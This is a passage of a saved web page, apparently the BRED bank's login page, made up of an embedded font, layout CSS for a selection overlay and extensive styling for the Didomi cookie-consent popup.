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) format("woff");
      font-weight: normal;
      font-style: normal
    }

    body[data-v-f3fb3dc8] {
      margin: 0;
      font-size: 100%;
      color: #3c4858
    }

    a[data-v-f3fb3dc8] {
      text-decoration: none;
      color: #45c8f1
    }

    h1[data-v-f3fb3dc8],
    h2[data-v-f3fb3dc8],
    h3[data-v-f3fb3dc8],
    h4[data-v-f3fb3dc8] {
      margin-top: 0
    }

    svg[data-v-f3fb3dc8] {
      outline: none
    }

    .container_selected_area[data-v-f3fb3dc8] {
      display: none;
      visibility: hidden;
      padding: 0;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 2147483647
    }

    .container_selected_area.active[data-v-f3fb3dc8] {
      visibility: visible;
      display: block
    }

    .container_selected_area .label[data-v-f3fb3dc8] {
      font-family: "Didact Gothic Regular", sans-serif;
      font-size: 22px;
      text-align: center;
      padding-top: 15px
    }

    .area[data-v-f3fb3dc8] {
      display: none;
      position: absolute;
      z-index: 2147483647;
      pointer-events: none;
      border: 1px solid #1e83ff;
      background: rgba(30, 131, 255, 0.1);
      box-sizing: border-box
    }

    .area.active[data-v-f3fb3dc8] {
      display: block;
      top: 0;
      left: 0
    }

    .hide[data-v-f3fb3dc8] {
      display: none
    }
  </style>
</head>

<body class="frontend icons-on portaltype-folder section-authentification site-bredfr template-layout thumbs-on userrole-anonymous viewpermission-none theme_bred layout-default-basic mosaic-grid show-anchormenu show-header" id="visual-portal-wrapper" dir="ltr" data-mb-content-api="https://api.bred.fr/enterprisesearch/v1/contents" data-main-search-url="/resultats-de-recherche" data-i18ncatalogurl="https://www.bred.fr/plonejsi18n" data-view-url="https://www.bred.fr/authentification" data-pat-plone-modal="{&quot;actionOptions&quot;: {&quot;displayInModal&quot;: false}}" data-portal-url="https://www.bred.fr" data-pat-pickadate="{&quot;date&quot;: {&quot;selectYears&quot;: 200}, &quot;time&quot;: {&quot;interval&quot;: 5 } }" data-base-url="https://www.bred.fr/authentification">
  <style type="text/css" scoped="true">
    #didomi-host .didomi-components-button {
      cursor: pointer;
      display: block;
      height: 38px;
      padding: 0 20px;
      font-size: 16px;
      line-height: 18px;
      font-weight: 700;
      text-align: center;
      color: #555;
      background-color: #eee;
      border: 1px solid rgba(34, 34, 34, .2)
    }

    #didomi-host .didomi-components-button:disabled {
      opacity: .4;
      cursor: auto
    }

    #didomi-host .didomi-components-button span {
      background: transparent
    }

    #didomi-host .didomi-mobile .didomi-components-button {
      font-size: 14px
    }

    #didomi-host .didomi-screen-xsmall .didomi-components-button {
      padding: 0 10px
    }

    #didomi-host .didomi-components-radio {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center
    }

    #didomi-host .didomi-components-radio__option {
      margin-right: 5px;
      cursor: pointer;
      height: 25px;
      box-shadow: 1px 1px 0 0 rgba(0, 0, 0, .1);
      background-color: #fff;
      border: 1px solid #eee;
      padding: 0 20px;
      line-height: 12px;
      font-size: 12px;
      color: #757575;
      font-weight: 700;
      transition: background-color .2s, border-color .2s;
      transition-timing-function: ease
    }

    #didomi-host .didomi-components-radio__option:hover {
      color: #757575;
      border-color: #757575
    }

    #didomi-host .didomi-components-radio__option:last-child {
      margin-right: 0
    }

    #didomi-host .didomi-components-radio__option:first-child,
    [dir=rtl] #didomi-host .didomi-components-radio__option:last-child {
      margin-right: 5px
    }

    [dir=rtl] #didomi-host .didomi-components-radio__option:first-child {
      margin-right: 0
    }

    #didomi-host .didomi-components-radio__option>svg {
      margin-right: 5px
    }

    #didomi-host .didomi-components-radio__option span {
      background: transparent
    }

    #didomi-host .didomi-components-radio__option.didomi-components-radio__option--agree {
      background-color: #3d8548;
      color: #fff;
      border: 1px solid rgba(0, 0, 0, .3);
      padding: 0 11.5px
    }

    #didomi-host .didomi-components-radio__option.didomi-components-radio__option--agree>svg {
      vertical-align: middle
    }

    #didomi-host .didomi-components-radio__option.didomi-components-radio__option--disagree {
      background-color: #e60000;
      color: #fff;
      border: 1px solid rgba(0, 0, 0, .3);
      padding: 0 13.5px
    }

    #didomi-host .didomi-components-radio__option__reporting {
      box-sizing: border-box
    }

    #didomi-host .didomi-components-radio__option__reporting#didomi-radio-option-agree-to-all,
    #didomi-host .didomi-components-radio__option__reporting#didomi-radio-option-disagree-to-all {
      font-size: 12px !important
    }

    #didomi-host .didomi-components-radio__option__accepter {
      box-sizing: border-box
    }

    #didomi-host .didomi-components-accordion {
      flex: 5
    }

    #didomi-host .didomi-components-accordion .label-click {
      cursor: pointer
    }

    #didomi-host .didomi-components-accordion .trigger-icon {
      width: 15px;
      font-size: 16px;
      display: inline-block;
      text-align: center
    }

    #didomi-host .didomi-components-accordion .didomi-content {
      overflow: hidden;
      max-height: 0;
      opacity: 0;
      visibility: hidden;
      font-weight: 300;
      text-align: justify;
      -webkit-transition: all .1s ease-in-out;
      -moz-transition: all .1s ease-in-out;
      -o-transition: all .1s ease-in-out;
      transition: all .1s ease-in-out;
      transition-property: opacity, max-height, transform, visibility, padding-bottom
    }

    #didomi-host .didomi-components-accordion .didomi-content.active {
      max-height: 3000px;
      opacity: 1;
      visibility: visible;
      padding-bottom: 10px;
      transition-property: opacity, max-height, transform, visibility
    }

    #didomi-host .didomi-components-accordion .didomi-components-accordion-label-container {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center
    }

    #didomi-host .didomi-mobile .didomi-components-accordion {
      width: 100%;
      flex: 1 auto
    }

    #didomi-host .didomi-mobile .didomi-components-accordion .didomi-components-accordion-label-container {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -moz-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: start;
      -moz-box-pack: start;
      -webkit-flex-pack: start;
      -ms-flex-pack: start;
      -moz-justify-content: flex-start;
      -webkit-justify-content: flex-start;
      justify-content: flex-start;
      -webkit-box-align: start;
      -ms-flex-align: start;
      -webkit-align-items: flex-start;
      -moz-align-items: flex-start;
      align-items: flex-start
    }

    #didomi-host .lds-ellipsis-container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100%
    }

    #didomi-host .lds-ellipsis-container .lds-ellipsis {
      display: inline-block;
      position: relative;
      width: 64px;
      height: 64px
    }

    #didomi-host .lds-ellipsis-container .lds-ellipsis div {
      position: absolute;
      top: 27px;
      width: 11px;
      height: 11px;
      border-radius: 50%;
      background: #dcdcdc;
      animation-timing-function: cubic-bezier(0, 1, 1, 0)
    }

    #didomi-host .lds-ellipsis-container .lds-ellipsis div:first-child {
      left: 6px;
      animation: lds-ellipsis1 .6s infinite
    }

    #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(2) {
      left: 6px;
      animation: lds-ellipsis2 .6s infinite
    }

    #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(3) {
      left: 26px;
      animation: lds-ellipsis2 .6s infinite
    }

    #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(4) {
      left: 45px;
      animation: lds-ellipsis3 .6s infinite
    }

    @keyframes lds-ellipsis1 {
      0% {
        transform: scale(0)
      }

      to {
        transform: scale(1)
      }
    }

    @keyframes lds-ellipsis3 {
      0% {
        transform: scale(1)
      }

      to {
        transform: scale(0)
      }
    }

    @keyframes lds-ellipsis2 {
      0% {
        transform: translate(0)
      }

      to {
        transform: translate(19px)
      }
    }

    #didomi-host .didomi-components-skip-link {
      position: absolute;
      top: -100px;
      left: -100px;
      margin-bottom: 16px;
      display: block
    }

    #didomi-host .didomi-components-skip-link:focus {
      position: relative;
      top: 0;
      left: 0
    }

    #didomi-host .didomi-popup-backdrop {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: hsla(0, 0%, 100%, .8);
      z-index: 2147483642;
      overflow: auto;
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      align-items: flex-start
    }

    [dir=rtl] #didomi-host .didomi-popup-backdrop {
      overflow-y: auto;
      overflow-x: hidden
    }

    #didomi-host .didomi-exterior-border {
      border-style: solid;
      border-radius: 5px;
      border-width: 1px;
      padding: 1px;
      margin: auto
    }

    #didomi-host .didomi-popup-container {
      background-color: #fff;
      opacity: 1;
      max-width: 650px;
      width: 100%;
      border-style: solid;
      border-radius: 3px;
      border-width: 1px;
      -webkit-overflow-scrolling: touch
    }

    #didomi-host .didomi-popup-header {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center;
      padding: 30px 20px 0;
      font-weight: 700;
      font-family: Arial
    }

    #didomi-host .didomi-popup-body {
      padding: 30px 20px
    }

    #didomi-host .didomi-popup-body .didomi-popup-body-section {
      margin-bottom: 22px
    }

    #didomi-host .didomi-popup-body .didomi-popup-body-section:last-child {
      margin-bottom: 0
    }

    #didomi-host .didomi-popup-footer {
      -webkit-box-pack: justify;
      -moz-box-pack: justify;
      -webkit-flex-pack: justify;
      -ms-flex-pack: justify;
      -moz-justify-content: space-between;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      background-color: #fff;
      height: 58px
    }

    #didomi-host .didomi-popup-footer,
    #didomi-host .didomi-popup-footer .didomi-popup-actions {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flexbox;
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
      -webkit-flex-direction: row;
      -moz-flex-direction: row;
      -ms-flex-direction: row;
      flex-direction: row;
      -webkit-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      -moz-align-items: center;
      align-items: center
    }

    #didomi-host .didomi-popup-footer .didomi-popup-actions {
      -webkit-box-pack: end;
      -moz-box-pack: end;
      -webkit-flex-pack: end;
      -ms-flex-pack: end;
      -moz-justify-content: flex-end;
      -webkit-justify-content: flex-end;
      justify-content: flex-end
    }

    #didomi-host .didomi-popup-footer .didomi-popup-actions button,
    #didomi-host .didomi-popup-footer .didomi-popup-actions div {
      margin-right: 10px
    }

    [dir=rtl] #didomi-host .didomi-popup-footer .didomi-popup-actions button,
    [dir=rtl] #didomi-host .didomi-popup-footer .didomi-popup-actions div {
      margin-right: 0;
      margin-left: 10px
    }

    #didomi-host .didomi-popup-close {
      font-family: Arial;
      opacity: .5;
      font-size: 30px;
      font-weight: 500;
      line-height: 30px;
      color: #000;
      text-shadow: 0 1px 0 #fff;
      transition: .5s
    }

    #didomi-host .didomi-popup-close:hover {
      opacity: .7
    }

    #didomi-host .didomi-mobile .didomi-popup {
      width: 100%;
      height: 100%;
      max-width: none
    }

    body.didomi-popup-open {
      overflow: hidden !important
    }

    body.didomi-popup-open-ios {
      position: fixed;
      width: 100%
    }

    #didomi-host .didomi-notice-data-processing-container {
      padding-top: 15px;
      text-align: justify;
      font-size: 12px;
      line-height: 160%
    }

    #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-title {
      color: #333;
      font-weight: 700;
      display: block
    }

    #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-list {
      font-weight: 700;
      color: #999
    }

    #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-list .didomi-notice-data-processing-item {
      padding-top: 5px
    }

    #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-list .didomi-notice-data-processing-item div {
      display: inline-block
    }

    #didomi-host .didomi-notice-data-processing-container p {
      font-size: 12px
    }

    #didomi-host .didomi-mobile .didomi-notice-data-processing-container .didomi-notice-data-processing-list,
    #didomi-host .didomi-mobile .didomi-notice-data-processing-container .didomi-notice-data-processing-title {
      font-size: 11px;
      line-height: 160%
    }

    @namespace svg "http://www.w3.org/2000/svg";

    #didomi-host {
      all: initial;
      -ms-overflow-style: auto;
      -moz-appearance: none;
      -moz-binding: none;
      -moz-border-bottom-colors: none;
      -moz-border-left-colors: none;
      -moz-border-right-colors: none;
      -moz-border-top-colors: none;
      -moz-context-properties: none;
      -moz-float-edge: content-box;
      -moz-force-broken-image-icon: 0;
      -moz-image-region: auto;
      -moz-orient: inline;
      -moz-outline-radius-bottomleft: 0;
      -moz-outline-radius-bottomright: 0;
      -moz-outline-radius-topleft: 0;
      -moz-outline-radius-topright: 0;
      -moz-stack-sizing: stretch-to-fit;
      -moz-text-blink: none;
      -moz-user-focus: none;
      -moz-user-input: auto;
      -moz-user-modify: read-only;
      -moz-window-shadow: default;
      -webkit-border-before-color: currentcolor;
      -webkit-border-before-style: none;
      -webkit-border-before-width: medium;
      -webkit-box-reflect: none;
      -webkit-mask-attachment: scroll;
      -webkit-mask-clip: border;
      -webkit-mask-composite: source-over;
      -webkit-mask-image: none;
      -webkit-mask-origin: padding;
      -webkit-mask-position: 0 0;
      -webkit-mask-position-x: 0;
      -webkit-mask-position-y: 0;
      -webkit-mask-repeat: repeat;
      -webkit-mask-repeat-x: repeat;
      -webkit-mask-repeat-y: repeat;
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
      -webkit-text-stroke-color: currentcolor;
      -webkit-text-stroke-width: 0;
      -webkit-touch-callout: default;
      align-content: stretch;
      align-items: stretch;
      align-self: auto;
      animation-delay: 0s;
      animation-direction: normal;
      animation-duration: 0s;
      animation-fill-mode: none;
      animation-iteration-count: 1;
      animation-name: none;
      animation-play-state: running;
      animation-timing-function: ease;
      azimuth: center;
      backface-visibility: visible;
      background-attachment: scroll;
      background-blend-mode: normal;
      background-clip: border-box;
      background-color: transparent;
      background-image: none;
      background-origin: padding-box;
      background-position: 0 0;
      background-repeat: repeat;
      background-size: auto auto;
      block-size: auto;
      border-block-end-color: currentcolor;
      border-block-end-style: none;
      border-block-end-width: medium;
      border-block-start-color: currentcolor;
      border-block-start-style: none;
      border-block-start-width: medium;
      border-bottom-color: currentcolor;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
      border-bottom-style: none;
      border-collapse: separate;
      border-image-outset: 0s;
      border-image-repeat: stretch;
      border-image-slice: 100%;
      border-image-source: none;
      border-image-width: 1;
      border-inline-end-color: currentcolor;
      border-inline-end-style: none;
      border-inline-end-width: medium;
      border-inline-start-color: currentcolor;
      border-inline-start-style: none;
      border-inline-start-width: medium;
      border-left-color: currentcolor;
      border-left-style: none;
      border: medium;
      border-right-color: currentcolor;
      border-right-style: none;
      border-spacing: 0;
      border-top-color: currentcolor;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
      border-top-style: none;
      bottom: auto;
      box-align: stretch;
      box-decoration-break: slice;
      box-direction: normal;
      box-flex: 0;
      box-flex-group: 1;
      box-lines: single;
      box-ordinal-group: 1;
      box-orient: initial;
      box-pack: start;
      box-shadow: none;
      box-sizing: content-box;
      break-after: auto;
      break-before: auto;
      break-inside: auto;
      caption-side: top;
      caret-color: auto;
      clear: none;
      clip: auto;
      clip-path: none;
      color: initial;
      column-count: auto;
      column-fill: balance;
      column-gap: normal;
      column-rule-color: currentcolor;
      column-rule-style: none;
      column-rule-width: medium;
      column-span: none;
      column-width: auto;
      content: normal;
      counter-increment: none;
      counter-reset: none;
      cursor: auto;
      empty-cells: show;
      filter: none;
      flex-basis: auto;
      flex-direction: row;
      flex-grow: 0;
      flex-shrink: 1;
      flex-wrap: nowrap;
      float: none;
      font-family: initial;
      font-feature-settings: normal;
      font-kerning: auto;
      font-language-override: normal;
      font-size: medium;
      font-size-adjust: none;
      font-stretch: normal;
      font-style: normal;
      font-synthesis: weight style;
      font-variant: normal;
      font-variant-alternates: normal;
      font-variant-caps: normal;
      font-variant-east-asian: normal;
      font-variant-ligatures: normal;
      font-variant-numeric: normal;
      font-variant-position: normal;
      font-weight: 400;
      grid-auto-columns: auto;
      grid-auto-flow: row;
      grid-auto-rows: auto;
      grid-column-end: auto;
      grid-column-gap: 0;
      grid-column-start: auto;
      grid-row-end: auto;
      grid-row-gap: 0;
      grid-row-start: auto;
      grid-template-areas: none;
      grid-template-columns: none;
      grid-template-rows: none;
      height: auto;
      hyphens: manual;
      image-orientation: 0deg;
      image-rendering: auto;
      image-resolution: 1dppx;
      ime-mode: auto;
      inline-size: auto;
      isolation: auto;
      justify-content: flex-start;
      left: auto;
      letter-spacing: normal;
      line-break: auto;
      line-height: normal;
      list-style-image: none;
      list-style-position: outside;
      list-style-type: disc;
      margin-block-end: 0;
      margin-block-start: 0;
      margin-inline-end: 0;
      margin-inline-start: 0;
      margin: 0;
      marker-offset: auto;
      mask-clip: border-box;
      mask-composite: add;
      mask-image: none;
      mask-mode: match-source;
      mask-origin: border-box;
      mask-position: 0 0;
      mask-repeat: repeat;
      mask-size: auto;
      mask-type: luminance;
      max-height: none;
      max-width: none;
      min-block-size: 0;
      min-height: 0;
      min-inline-size: 0;
      min-width: 0;
      mix-blend-mode: normal;
      object-fit: fill;
      object-position: 50% 50%;
      offset-block-end: auto;
      offset-block-start: auto;
      offset-inline-end: auto;
      offset-inline-start: auto;
      opacity: 1;
      order: 0;
      orphans: 2;
      outline-color: initial;
      outline-offset: 0;
      outline-style: none;
      outline-width: medium;
      overflow: visible;
      overflow-clip-box: padding-box;
      overflow-wrap: normal;
      overflow-x: visible;
      overflow-y: visible;
      padding-block-end: 0;
      padding-block-start: 0;
      padding-inline-end: 0;
      padding-inline-start: 0;
      padding: 0;
      page-break-after: auto;
      page-break-before: auto;
      page-break-inside: auto;
      perspective: none;
      perspective-origin: 50% 50%;
      pointer-events: auto;
      position: static;
      quotes: initial;
      resize: none;
      right: auto;
      ruby-align: space-around;
      ruby-merge: separate;
      ruby-position: over;
      scroll-behavior: auto;
      scroll-snap-coordinate: none;
      scroll-snap-destination: 0 0;
      scroll-snap-points-x: none;
      scroll-snap-points-y: none;
      scroll-snap-type: none;
      scroll-snap-type-x: none;
      scroll-snap-type-y: none;
      shape-image-threshold: 0;
      shape-margin: 0;
      shape-outside: none;
      tab-size: 8;
      table-layout: auto;
      text-align: initial;
      text-align-last: auto;
      text-combine-upright: none;
      text-decoration-color: currentcolor;
      text-decoration-line: none;
      text-decoration-style: solid;
      text-emphasis-color: currentcolor;
      text-emphasis-position: over right;
      text-emphasis-style: none;
      text-indent: 0;
      text-justify: auto;
      text-orientation: mixed;
      text-overflow: clip;
      text-rendering: auto;
      text-shadow: none;
      text-transform: none;
      text-underline-position: auto;
      top: auto;
      touch-action: auto;
      transform: none;
      transform-box: border-box;
      transform-origin: 50% 50% 0;
      transform-style: flat;
      transition-delay: 0s;
      transition-duration: 0s;
      transition-property: all;
      transition-timing-function: ease;
      user-select: auto;
      vertical-align: baseline;
      visibility: visible;
      white-space: normal;
      widows: 2;
      width: auto;
      will-change: auto;
      word-break: normal;
      word-spacing: normal;
      word-wrap: normal;
      writing-mode: horizontal-tb;
      z-index: auto;
      -webkit-appearance: none;
      -ms-appearance: none;
      appearance: none
    }

    #didomi-host :not(svg|*) {
      all: unset;
      -webkit-text-fill-color: initial
    }

    button {
      line-height: normal
    }

    button span {
      padding: 0;
      background: initial;
      height: auto
    }

    #didomi-host {
      display: block;
      width: 0;
      height: 0;
      font-size: 15px;
      line-height: 160%;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased
    }

    #didomi-host .pad {
      padding: 16px
    }

    #didomi-host .pad-xxl {
      padding: 56px
    }

    #didomi-host .pad-xl {
      padding: 48px
    }

    #didomi-host .pad-lg {
      padding: 32px
    }

    #didomi-host .pad-md {
      padding: 24px
    }

    #didomi-host .pad-sm {
      padding: 8px
    }

    #didomi-host .pad-xs {
      padding: 4px
    }

    #didomi-host .pad-none {
      padding: 0
    }

    #didomi-host .pad-bottom {
      padding-bottom: 16px
    }

    #didomi-host .pad-bottom-xxl {
      padding-bottom: 56px
    }

    #didomi-host .pad-bottom-xl {
      padding-bottom: 48px
    }

    #didomi-host .pad-bottom-lg {
      padding-bottom: 32px
    }

    #didomi-host .pad-bottom-md {
      padding-bottom: 24px
    }

    #didomi-host .pad-bottom-sm {
      padding-bottom: 8px
    }

    #didomi-host .pad-bottom-xs {
      padding-bottom: 4px
    }

    #didomi-host .pad-bottom-none {
      padding-bottom: 0
    }

    #didomi-host .pad-top {
      padding-top: 16px
    }

    #didomi-host .pad-top-xxl {
      padding-top: 56px
    }

    #didomi-host .pad-top-xl {
      padding-top: 48px
    }

    #didomi-host .pad-top-lg {
      padding-top: 32px
    }

    #didomi-host .pad-top-md {
      padding-top: 24px
    }

    #didomi-host .pad-top-sm {
      padding-top: 8px
    }

    #didomi-host .pad-top-xs {
      padding-top: 4px
    }

    #didomi-host .pad-top-none {
      padding-top: 0
    }

    #didomi-host .pad-left {
      padding-left: 16px
    }

    #didomi-host .pad-left-xxl {
      padding-left: 56px
    }

    #didomi-host .pad-left-xl {
      padding-left: 48px
    }

    #didomi-host .pad-left-lg {
      padding-left: 32px
    }

    #didomi-host .pad-left-md {
      padding-left: 24px
    }

    #didomi-host .pad-left-sm {
      padding-left: 8px
    }

    #didomi-host .pad-left-xs {
      padding-left: 4px
    }

    #didomi-host .pad-left-none {
      padding-left: 0
    }

    #didomi-host .pad-right {
      padding-right: 16px
    }

    #didomi-host .pad-right-xxl {
      padding-right: 56px
    }

    #didomi-host .pad-right-xl {
      padding-right: 48px
    }

    #didomi-host .pad-right-lg {
      padding-right: 32px
    }

    #didomi-host .pad-right-md {
      padding-right: 24px
    }

    #didomi-host .pad-right-sm {
      padding-right: 8px
    }

    #didomi-host .pad-right-xs {
      padding-right: 4px
    }

    #didomi-host .pad-right-none {
      padding-right: 0
    }

    #didomi-host .pull-xxl {
      margin: -56px
    }

    #didomi-host .pull-xl {
      margin: -48px
    }

    #didomi-host .pull-lg {
      margin: -32px
    }

    #didomi-host .pull-md {
      margin: -24px
    }

    #didomi-host .pull {
      margin: -16px
    }

    #didomi-host .pull-sm {
      margin: -8px
    }

    #didomi-host .pull-xs {
      margin: -4px
    }

    #didomi-host .pull-none {
      margin: 0
    }

    #didomi-host .pull-bottom-xxl {
      margin-bottom: -56px
    }

    #didomi-host .pull-bottom-xl {
      margin-bottom: -48px
    }

    #didomi-host .pull-bottom-lg {
      margin-bottom: -32px
    }

    #didomi-host .pull-bottom-md {
      margin-bottom: -24px
    }

    #didomi-host .pull-bottom {
      margin-bottom: -16px
    }

    #didomi-host .pull-bottom-sm {
      margin-bottom: -8px
    }

    #didomi-host .pull-bottom-xs {
      margin-bottom: -4px
    }

    #didomi-host .pull-bottom-none {
      margin-bottom: 0
    }

    #didomi-host .pull-top-xxl {
      margin-top: -56px
    }

    #didomi-host .pull-top-xl {
      margin-top: -48px
    }

    #didomi-host .pull-top-lg {
      margin-top: -32px
    }

    #didomi-host .pull-top-md {
      margin-top: -24px
    }

    #didomi-host .pull-top {
      margin-top: -16px
    }

    #didomi-host .pull-top-sm {
      margin-top: -8px
    }

    #didomi-host .pull-top-xs {
      margin-top: -4px
    }

    #didomi-host .pull-top-none {
      margin-top: 0
    }

    #didomi-host .pull-left-xxl {
      margin-left: -56px
    }

    #didomi-host .pull-left-xl {
      margin-left: -48px
    }

    #didomi-host .pull-left-lg {
      margin-left: -32px
    }

    #didomi-host .pull-left-md {
      margin-left: -24px
    }

    #didomi-host .pull-left {
      margin-left: -16px
    }

    #didomi-host .pull-left-sm {
      margin-left: -8px
    }

    #didomi-host .pull-left-xs {
      margin-left: -4px
    }

    #didomi-host .pull-left-none {
      margin-left: 0
    }

    #didomi-host .pull-right-xxl {
      margin-right: -56px
    }

    #didomi-host .pull-right-xl {
      margin-right: -48px
    }

    #didomi-host .pull-right-lg {
      margin-right: -32px
    }

    #didomi-host .pull-right-md {
      margin-right: -24px
    }

    #didomi-host .pull-right {
      margin-right: -16px
    }

    #didomi-host .pull-right-sm {
      margin-right: -8px
    }

    #didomi-host .pull-right-xs {
